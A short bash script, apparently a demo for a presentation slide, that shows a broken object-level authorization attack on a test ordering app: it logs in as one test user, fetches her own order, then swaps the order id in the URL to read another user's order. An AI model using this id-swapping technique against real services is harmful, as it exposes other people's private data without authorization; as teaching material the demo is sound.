#!/usr/bin/env bash
# Attack 01 · Broken object-level authorization (slide 12)
source "$(dirname "$0")/_lib.sh"

say "Log in as Ada (user 7)"
TOKEN=$(login ada@orderdesk.test ada-password)
echo "token: ${TOKEN:0:24}…"

say "Ada reads her own order 1041"
curl -s "$BASE/api/orders/1041" -H "authorization: Bearer $TOKEN"; echo

say "Ada changes the id to 1043 (Chidi's order)"
curl -si "$BASE/api/orders/1043" -H "authorization: Bearer $TOKEN"; echo
